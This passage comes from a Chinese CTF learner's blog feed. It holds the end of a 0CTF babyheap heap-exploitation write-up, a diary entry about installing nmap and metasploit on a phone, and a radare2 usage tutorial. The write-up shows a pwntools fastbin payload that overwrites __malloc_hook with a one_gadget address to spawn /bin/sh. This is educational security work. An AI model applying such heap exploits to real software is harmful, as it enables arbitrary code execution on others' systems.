0x55dcc4edc430, </span><br><span class="line">  last_remainder = 0x0, </span><br><span class="line">  bins = &#123;...&#125;</span><br><span class="line">  binmap = &#123;0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">  next = 0x7fc47fa61c40 &lt;main_arena&gt;, &lt;------------## main_arena address </span><br><span class="line">  next_free = 0x0, </span><br><span class="line">  attached_threads = 0x1, </span><br><span class="line">  system_mem = 0x21000, </span><br><span class="line">  max_system_mem = 0x21000</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start              End                PermName</span><br><span class="line">0x00003b8f7c613000 0x00003b8f7c614000 rw-pmapped</span><br><span class="line">0x000055dcc365b000 0x000055dcc365d000 r-xp/root/heap/0ctfbabyheap</span><br><span class="line">0x000055dcc385c000 0x000055dcc385d000 r--p/root/heap/0ctfbabyheap</span><br><span class="line">0x000055dcc385d000 0x000055dcc385e000 rw-p/root/heap/0ctfbabyheap</span><br><span class="line">0x000055dcc4edc000 0x000055dcc4efd000 rw-p[heap]</span><br><span class="line">0x00007fc47f8aa000 0x00007fc47f8cc000 r--p/usr/lib/x86_64-linux-gnu/libc-2.27.so   // I don&apos;t really know what address we need.</span><br><span class="line">0x00007fc47f8cc000 0x00007fc47fa12000 r-xp/usr/lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">0x00007fc47fa12000 0x00007fc47fa5d000 r--p/usr/lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">0x00007fc47fa5d000 0x00007fc47fa61000 r--p/usr/lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">0x00007fc47fa61000 0x00007fc47fa63000 rw-p/usr/lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">0x00007fc47fa63000 0x00007fc47fa67000 rw-pmapped</span><br><span class="line">0x00007fc47fa67000 0x00007fc47fa69000 rw-pmapped</span><br><span class="line">0x00007fc47fa8a000 0x00007fc47fa8b000 r--p/usr/lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">0x00007fc47fa8b000 0x00007fc47faa9000 r-xp/usr/lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">0x00007fc47faa9000 0x00007fc47fab1000 r--p/usr/lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">0x00007fc47fab1000 0x00007fc47fab2000 r--p/usr/lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">0x00007fc47fab2000 0x00007fc47fab3000 rw-p/usr/lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">0x00007fc47fab3000 0x00007fc47fab4000 rw-pmapped</span><br><span class="line">0x00007ffd42afd000 0x00007ffd42b1e000 rw-p[stack]</span><br><span class="line">0x00007ffd42bee000 0x00007ffd42bf1000 r--p[vvar]</span><br><span class="line">0x00007ffd42bf1000 0x00007ffd42bf3000 r-xp[vdso]</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------#</span><br><span class="line"></span><br><span class="line">#alloc(0x60)</span><br><span class="line">free(4)</span><br><span class="line"> </span><br><span class="line">payload = p64(libc_base+0x3c4aed)      //malloc_hook&apos;s 0x000000007f address - 0x8 </span><br><span class="line">fill(2, payload)</span><br><span class="line"> </span><br><span class="line">alloc(0x60)</span><br><span class="line">alloc(0x60)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">payload = p8(0)*3                    //using offset wisely make 0x7f***** as fake size &apos;0x000000007f&apos;</span><br><span class="line">payload += p64(0)*2</span><br><span class="line">payload += p64(libc_base+0x4345e)    //tools called &apos;one_gadget&apos; can help get execv(&apos;/bin/sh&apos;) directly;</span><br><span class="line">fill(6, payload)</span><br><span class="line"> </span><br><span class="line">#------------------------------------------------------------------------#</span><br><span class="line">root@kali:~/heap# ldd ./0ctfbabyheap </span><br><span class="line">linux-vdso.so.1 (0x00007ffd59ff6000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007faf4646f000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007faf46852000)</span><br><span class="line"></span><br><span class="line">root@kali:~/heap# one_gadget /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x4345eexecve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x434b2execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xe42eeexecve(&quot;/bin/sh&quot;, rsp+0x60, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x60] == NULL</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------#</span><br><span class="line">alloc(255)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>reference:<br><a href="https://blog.csdn.net/qq_35519254/article/details/78213962?utm_source=blogxgwz1" target="_blank" rel="noopener">https://blog.csdn.net/qq_35519254/article/details/78213962?utm_source=blogxgwz1</a><br><a href="https://bbs.pediy.com/thread-223461.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-223461.htm</a></p><p><em>没有人指导堆的学习，日常入门到入土，太难受了。主要是前天打比赛结果很惨烈，希望能加把劲把基础的堆问题给解决掉，下次比赛尽量能够解决一些堆的题。</em></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Diary.20181008</title>
      <link href="/2018/10/08/diary-20181008/"/>
      <url>/2018/10/08/diary-20181008/</url>
      <content type="html"><![CDATA[<p>  下午摸了一道题，比较简单的格式化字符串；之后摸手机端的 termux ，试图在上面安装 nmap，metasploit；<br>nmap还是很顺利的，但是metasploit搞到自闭……各种安装包问题，一步一步的找问题找解决方法才好不容易把解决；<br>黑域brevent也搞了半天，最后我还是选择绿色守护……手机最近掉电掉的有点严重，必须管一管了；<br>配合帅气的termux，搞了个hacker’s keyboard ，打起字来方便了不少， 还换了个hacker live wallpaper，也就是像是黑客帝国那样的动态壁纸，hhhh整个手机炫酷了不少。<br>周四林少华老师要来学校做客震旦讲堂！！！一定要过去，顺便看能不能混个签名hhh</p><p>…搞了半天特定文章的加密，反而全都无法通过，搞不懂怎么回事…真麻烦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    (function()&#123;</span><br><span class="line">        if(&apos;&#123;&#123; page.password&#125;&#125;&apos; !== 0)&#123;</span><br><span class="line">            if (prompt(&apos;PASSWORD&apos;) !== &apos;&#123;&#123; page.password &#125;&#125;&apos;)&#123;</span><br><span class="line">                alert(&apos;Wrong！&apos;);</span><br><span class="line">                history.back();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>上面这个运用js的alert阻断机制，但是会把我所有文章都加密。。<br>这下好了，越来越糟糕</p><p>hexo-blog-encrypt 这个组件都不能用。。没办法了</p>]]></content>
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Radare2</title>
      <link href="/2018/09/25/radare2/"/>
      <url>/2018/09/25/radare2/</url>
      <content type="html"><![CDATA[<p><em>之前听闻学长说许多大佬都用这个工具？(雾；就没事来瞎搞一搞这个可以用来逆向或pwn的神器？感觉还是很帅的hhhh，就是用起来有点emmm</em></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>git clone r2仓库即可，尽量每天使用前 ./sys/install.sh 更新一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/radare/radare2.git</span><br><span class="line">$ cd radare2</span><br><span class="line">$ ./sys/install.sh</span><br></pre></td></tr></table></figure><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><em>之后学习使用中逐渐更新</em><br>常用包含工具：</p><ul><li>radare2-&gt;整合了所有工具</li><li>rabin2-&gt;查看文件格式的</li><li>radiff2-&gt;比较文件不同的</li><li>rahash2-&gt;各种密码算法，hash算法集成</li><li>rasm2-&gt;汇编和反汇编</li><li>ragg2-&gt;开发shellcode工具(radare2自己编写的编译器)</li></ul><h3 id="radare2"><a href="#radare2" class="headerlink" title="radare2"></a>radare2</h3><pre><code>随便加载个文件,会有一句欢迎语hhhh</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$r2 pwnme</span><br><span class="line"> -- We only have bugs, features are an unintended side-effect</span><br><span class="line">[0x08049090]&gt;                  //工具找到的入口位置</span><br></pre></td></tr></table></figure><h3 id="rabin2"><a href="#rabin2" class="headerlink" title="rabin2"></a>rabin2</h3><pre><code>查看文件基本信息</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># rabin2 -I pwnme</span><br><span class="line">arch     x86</span><br><span class="line">baddr    0x8048000</span><br><span class="line">binsz    14275</span><br><span class="line">bintype  elf</span><br><span class="line">bits     32</span><br><span class="line">canary   false</span><br><span class="line">sanitiz  false</span><br><span class="line">class    ELF32</span><br><span class="line">crypto   false</span><br><span class="line">endian   little</span><br><span class="line">havecode true</span><br><span class="line">intrp    /lib/ld-linux.so.2</span><br><span class="line">lang     c</span><br><span class="line">linenum  true</span><br><span class="line">lsyms    true</span><br><span class="line">machine  Intel 80386</span><br><span class="line">maxopsz  16</span><br><span class="line">minopsz  1</span><br><span class="line">nx       true</span><br><span class="line">os       linux</span><br><span class="line">pcalign  0</span><br><span class="line">pic      false</span><br><span class="line">relocs   true</span><br><span class="line">relro    partial</span><br><span class="line">rpath    NONE</span><br><span class="line">static   false</span><br><span class="line">stripped false</span><br><span class="line">subsys   linux</span><br><span class="line">va       true</span><br></pre></td></tr></table></figure><h3 id="rahash2"><a href="#rahash2" class="headerlink" title="rahash2"></a>rahash2</h3><pre><code>支持超多加解密</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"># rahash2 -L    //列举</span><br><span class="line">Available Hashes: </span><br><span class="line">h  md5</span><br><span class="line">h  sha1</span><br><span class="line">h  sha256</span><br><span class="line">h  sha384</span><br><span class="line">h  sha512</span><br><span class="line">h  md4</span><br><span class="line">h  xor</span><br><span class="line">h  xorpair</span><br><span class="line">h  parity</span><br><span class="line">h  entropy</span><br><span class="line">h  hamdist</span><br><span class="line">h  pcprint</span><br><span class="line">h  mod255</span><br><span class="line">h  xxhash</span><br><span class="line">h  adler32</span><br><span class="line">h  luhn</span><br><span class="line">h  crc8smbus</span><br><span class="line">h  crc15can</span><br><span class="line">h  crc16</span><br><span class="line">h  crc16hdlc</span><br><span class="line">h  crc16usb</span><br><span class="line">h  crc16citt</span><br><span class="line">h  crc24</span><br><span class="line">h  crc32</span><br><span class="line">h  crc32c</span><br><span class="line">h  crc32ecma267</span><br><span class="line">h  crc32bzip2</span><br><span class="line">h  crc32d</span><br><span class="line">h  crc32mpeg2</span><br><span class="line">h  crc32posix</span><br><span class="line">h  crc32q</span><br><span class="line">h  crc32jamcrc</span><br><span class="line">h  crc32xfer</span><br><span class="line">h  crc64</span><br><span class="line">h  crc64ecma</span><br><span class="line">h  crc64we</span><br><span class="line">h  crc64xz</span><br><span class="line">h  crc64iso</span><br><span class="line"></span><br><span class="line">Available Encoders/Decoders: </span><br><span class="line">e  base64</span><br><span class="line">e  base91</span><br><span class="line">e  punycode</span><br><span class="line"></span><br><span class="line">Available Crypto Algos: </span><br><span class="line">c  rc2</span><br><span class="line">c  rc4</span><br><span class="line">c  rc6</span><br><span class="line">c  aes-ecb</span><br><span class="line">c  aes-cbc</span><br><span class="line">c  ror</span><br><span class="line">c  rol</span><br><span class="line">c  rot</span><br><span class="line">c  blowfish</span><br><span class="line">c  cps2</span><br><span class="line">c  des-ecb</span><br><span class="line">c  xor</span><br><span class="line">c  serpent-ecb</span><br><span class="line"></span><br><span class="line"># rahash2 -a md5 ./pwnme       //生成md5哈希</span><br><span class="line">./pwnme: 0x00000000-0x00003c73 md5: 2569b37607fc52065f5b4e7c349d0e56</span><br></pre></td></tr></table></figure><h3 id="rasm2"><a href="#rasm2" class="headerlink" title="rasm2"></a>rasm2</h3><pre><code>支持汇编反汇编 </code></pre><h3 id="ragg2"><a href="#ragg2" class="headerlink" title="ragg2"></a>ragg2</h3><pre><code>据说可以用来快速开发shellcode？</code></pre><h3 id="radiff2"><a href="#radiff2" class="headerlink" title="radiff2"></a>radiff2</h3><pre><code>支持二进制文件的字节级或增量差异对比，查找基本代码块中的更改。P.S.暂时不晓得有啥用</code></pre><h3 id="rafind2"><a href="#rafind2" class="headerlink" title="rafind2"></a>rafind2</h3><pre><code>在文件中查找字节模式</code></pre><h3 id="rarun2"><a href="#rarun2" class="headerlink" title="rarun2"></a>rarun2</h3><pre><code>用于在不同环境中运行程序的启动器，具有不同的参数，权限，目录和覆盖的默认文件描述符。rarun2可用于：* 破解小程序* 模糊测试* 测试组件</code></pre><h3 id="rax2"><a href="#rax2" class="headerlink" title="rax2"></a>rax2</h3><pre><code>用于shell的简约数学表达式求值器，用于在浮点值，十六进制表示，十六进制字符串到ASCII之间进行基本转换，八进制到整数等。它还支持字节顺序设置，如果没有参数，可以用作交互式shell 给出。</code></pre><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><ul><li>i 开头的命令主要是用来获取各种信息。iz – 列出数据段里的字符串</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[0x08049090]&gt; ie</span><br><span class="line">[Entrypoints]</span><br><span class="line">vaddr=0x08049090 paddr=0x00001090 baddr=0x08048000 laddr=0x00000000 haddr=0x00000018 type=program</span><br><span class="line"></span><br><span class="line">1 entrypoints</span><br><span class="line"></span><br><span class="line">[0x08049090]&gt; iz</span><br><span class="line">[Strings]</span><br><span class="line">Num Vaddr      Paddr      Len Size Section  Type  String</span><br><span class="line">000 0x00002008 0x0804a008   7   8 (.rodata) ascii /bin/sh</span><br><span class="line">001 0x00002010 0x0804a010   5   6 (.rodata) ascii input</span><br></pre></td></tr></table></figure><ul><li>a 开头的命令主要是用来分析文件。radare2 不会主动去分析一个文件，因为这样做的代价太大了，它需要花费很多的时间。也可以在运行 radare2的使用 -A 参数来直接分析一个文件(例如 r2 -A pwnme)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># r2 -A pwnme</span><br><span class="line">[x] Analyze all flags starting with sym. and entry0 (aa)</span><br><span class="line">[x] Analyze function calls (aac)</span><br><span class="line">[x] Analyze len bytes of instructions for references (aar)</span><br><span class="line">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)</span><br><span class="line">[x] Type matching analysis for all functions (afta)</span><br><span class="line">[x] Use -AA or aaaa to perform additional experimental analysis.</span><br><span class="line"> -- r2OS r2pad 0.1 SMP GENERIC r2_64 GNU/r2OS</span><br></pre></td></tr></table></figure><ul><li>fs 分析完成之后， r2会将所有有用的信息和特定的名字绑定在一起，比如区段、函数、符号、字符串，这些都被称作 ‘flags’, flags 被整合进 <flag spaces="">，一个 flag 是所有类似特征的集合。可以使用 ‘fs <flagspaces>‘ 加 ‘f’ 来打印出 这个 flags 下面包含的信息，使用分号来间隔多条命令(‘cmd1;cmd2;cmd3;…’).</flagspaces></flag></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[0x08049090]&gt; fs</span><br><span class="line">0    2 * strings</span><br><span class="line">1   37 * symbols</span><br><span class="line">2   30 * sections</span><br><span class="line">3   12 * segments</span><br><span class="line">4    5 * relocs</span><br><span class="line">5    5 * imports</span><br><span class="line">6    2 * functions</span><br><span class="line">[0x08049090]&gt; fs strings;f</span><br><span class="line">0x0804a008 8 str.bin_sh</span><br><span class="line">0x0804a010 6 str.input</span><br></pre></td></tr></table></figure><ul><li><p>axt 命令用来在 data/code段里找寻某个地址相关的引用（更多的操作，请看 ‘ax?’）.‘@@’就像一个迭代器，用来在地址空间里不断地匹配后面一系列相关的命令（更多操作，请看 ‘@@?’）， ‘str.*’ 是一个通配符，用来标记所有以 ‘str.’开头的信息，这个不光会列出字符串标志，同时也包括函数名，找到它们到底在哪里以及何处被调用。</p></li><li><p>vv 大概是会显示函数列表和入口处的函数？可以查看各个函数(花里胡哨的，很漂亮哦，不如我们。。)</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">-[ functions ]----------------- pdf ---</span><br><span class="line">(a) add     (x) xrefs  (q) quit  (jk) next/prev                         ;-- section..text:</span><br><span class="line">(r) rename  (c) calls  (g) go    (tab) column                           ;-- eip:</span><br><span class="line">(d) delete  (v) vars   (?) help  (:)  enter cmd             / (fcn) entry0 50</span><br><span class="line">&gt;* 0x08049090   50 entry0                                   |   entry0 ();</span><br><span class="line">   0x080490c3    4 fcn.080490c3                             |           0x08049090      xor ebp, ebp                               ; [14] -r-x secti</span><br><span class="line">   0x08049070    6 sym.imp.__libc_start_main                |           0x08049092      pop esi</span><br><span class="line">   0x080490f0   40 sym.deregister_tm_clones                 |           0x08049093      mov ecx, esp</span><br><span class="line">   0x08049130   53 sym.register_tm_clones                   |           0x08049095      and esp, 0xfffffff0</span><br><span class="line">   0x08049170   30 sym.__do_global_dtors_aux                |           0x08049098      push eax</span><br><span class="line">   0x080491a0    2 entry1.init                              |           0x08049099      push esp</span><br><span class="line">   0x080492b0    2 sym.__libc_csu_fini                      |           0x0804909a      push edx</span><br><span class="line">   0x080490e0    4 sym.__x86.get_pc_thunk.bx                |           0x0804909b      call fcn.080490c3</span><br><span class="line">   0x080492b4   20 sym._fini                                |           0x080490a0      add ebx, 0x2f60                            ; &apos;`/&apos;</span><br><span class="line">   0x08049250   93 sym.__libc_csu_init                      |           0x080490a6      lea eax, [ebx - 0x2d50]</span><br><span class="line">   0x080490d0    2 sym._dl_relocate_static_pie              |           0x080490ac      push eax                                   ; func fini</span><br><span class="line">   0x08049203   65 sym.main                                 |           0x080490ad      lea eax, [ebx - 0x2db0]</span><br><span class="line">   0x08049244    4 sym.__x86.get_pc_thunk.ax                |           0x080490b3      push eax                                   ; func init</span><br><span class="line">   0x08049050    6 sym.imp.puts                             |           0x080490b4      push ecx                                   ; char **ubp_av</span><br><span class="line">   0x080491cd   54 sym.vulnerable                           |           0x080490b5      push esi                                   ; int argc</span><br><span class="line">   0x08049040    6 sym.imp.gets                             |           0x080490b6      mov eax, sym.main                          ; 0x8049203</span><br><span class="line">   0x080491a2   43 sym.flag                                 |           0x080490bc      push eax                                   ; func main</span><br><span class="line">   0x08049060    6 sym.imp.system                           \           0x080490bd      call sym.imp.__libc_start_main             ; int __libc_star</span><br><span class="line">   0x08049000   35 sym._init</span><br><span class="line">   0x08049080    6 sub.__gmon_start_80</span><br></pre></td></tr></table></figure><ul><li>s 命令可以跳转到某个地址或者已经有了符号的函 数中去。然后我们使用pdf这个命令可以打印main这个函数的汇编代码。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[0x08049090]&gt; s main</span><br><span class="line">[0x08049203]&gt; pdf</span><br><span class="line">            ;-- main:</span><br><span class="line">/ (fcn) sym.main 65</span><br><span class="line">|   sym.main (int argc, char **argv, char **envp);</span><br><span class="line">|           ; var int local_8h @ ebp-0x8</span><br><span class="line">|           ; arg int arg_4h @ esp+0x4</span><br><span class="line">|           ; DATA XREF from entry0 (0x80490b6)</span><br><span class="line">|           0x08049203      8d4c2404       lea ecx, [arg_4h]           ; 4</span><br><span class="line">|           0x08049207      83e4f0         and esp, 0xfffffff0</span><br><span class="line">|           0x0804920a      ff71fc         push dword [ecx - 4]</span><br><span class="line">|           0x0804920d      55             push ebp</span><br><span class="line">|           0x0804920e      89e5           mov ebp, esp</span><br><span class="line">|           0x08049210      53             push ebx</span><br><span class="line">|           0x08049211      51             push ecx</span><br><span class="line">|           0x08049212      e82d000000     call sym.__x86.get_pc_thunk.ax</span><br><span class="line">|           0x08049217      05e92d0000     add eax, 0x2de9</span><br><span class="line">|           0x0804921c      83ec0c         sub esp, 0xc</span><br><span class="line">|           0x0804921f      8d9010e0ffff   lea edx, [eax - 0x1ff0]</span><br><span class="line">|           0x08049225      52             push edx                    ; const char *s</span><br><span class="line">|           0x08049226      89c3           mov ebx, eax</span><br><span class="line">|           0x08049228      e823feffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">|           0x0804922d      83c410         add esp, 0x10</span><br><span class="line">|           0x08049230      e898ffffff     call sym.vulnerable</span><br><span class="line">|           0x08049235      b800000000     mov eax, 0</span><br><span class="line">|           0x0804923a      8d65f8         lea esp, [local_8h]</span><br><span class="line">|           0x0804923d      59             pop ecx</span><br><span class="line">|           0x0804923e      5b             pop ebx</span><br><span class="line">|           0x0804923f      5d             pop ebp</span><br><span class="line">|           0x08049240      8d61fc         lea esp, [ecx - 4]</span><br><span class="line">\           0x08049243      c3             ret</span><br></pre></td></tr></table></figure><p>radare2还实现了IDA的类似F5功能，我们可以使用pdc命令来实现。(目前看上去真不怎么样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[0x08049203]&gt; pdc</span><br><span class="line">function sym.main () &#123;</span><br><span class="line">    //  1 basic blocks</span><br><span class="line"></span><br><span class="line">    loc_0x8049203:</span><br><span class="line"></span><br><span class="line">  //DATA XREF from entry0 (0x80490b6)</span><br><span class="line">       ecx = [arg_4h]           //4</span><br><span class="line">       esp &amp;= 0xfffffff0        //ebp</span><br><span class="line">       push dword [ecx - 4]</span><br><span class="line">       push ebp</span><br><span class="line">       ebp = esp</span><br><span class="line">       push ebx</span><br><span class="line">       push ecx</span><br><span class="line">       sym.__x86.get_pc_thunk.ax ()</span><br><span class="line">       eax += 0x2de9            //obj._GLOBAL_OFFSET_TABLE</span><br><span class="line">       esp -= 0xc</span><br><span class="line">       edx = [eax - 0x1ff0]     //&quot;input&quot; str.input</span><br><span class="line">       push edx                 //const char *s ; (pstr 0x0804a010) &quot;input&quot;</span><br><span class="line">       ebx = eax                //obj._GLOBAL_OFFSET_TABLE</span><br><span class="line">       </span><br><span class="line">       int puts(const char * s : (*0x804a010)0x00177fe0 = input)</span><br><span class="line">       esp += 0x10</span><br><span class="line">       sym.vulnerable ()</span><br><span class="line">       eax = 0</span><br><span class="line">       esp = [local_8h]</span><br><span class="line">       pop ecx</span><br><span class="line">       pop ebx</span><br><span class="line">                                //ebp</span><br><span class="line">       esp = [ecx - 4]          //ebp</span><br><span class="line">       return</span><br><span class="line">(break)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有框架结构界面，我们可以使用大写的VV命令来到框架结构界面。(很赞</p><pre><code>.---------------------------------------------------.     | [0x8049203]                                       |     | ;-- main:                                         |     | ;-- eip:                                          |     | (fcn) sym.main 65                                 |     |   sym.main (int argc, char **argv, char **envp);  |     | ; var int local_8h @ ebp-0x8                      |     | ; arg int arg_4h @ esp+0x4                        |     | ; DATA XREF from entry0 (0x80490b6)               |     | ; 4     |     | lea ecx, [arg_4h]                                 |     | and esp, 0xfffffff0                               |     | push dword [ecx - 4]                              |     | push ebp                                          |     | mov ebp, esp                                      |     | push ebx                                          |     | push ecx                                          |     | call sym.__x86.get_pc_thunk.ax;[ga]               |     | add eax, 0x2de9                                   |     | sub esp, 0xc                                      |     | lea edx, [eax - 0x1ff0]                           |     | ; const char *s                                   |     | push edx                                          |     | mov ebx, eax                                      |     | ; int puts(const char *s)                         |     | call sym.imp.puts;[gb]                            |     | add esp, 0x10                                     |     | call sym.vulnerable;[gc]                          |     | mov eax, 0                                        |     | lea esp, [local_8h]                               |  `---------------------------------------------------&apos;                                          </code></pre><p><em>目前就了解了这一点，参考了一些大佬的文章，之后可以尝试着去使用，仅仅局限于IDA,GDB是不行的。就这样。</em></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Jarvis OJ-pwn</title>
      <link href="/2018/09/13/jarvis-oj-pwn/"/>
      <url>/2018/09/13/jarvis-oj-pwn/</url>
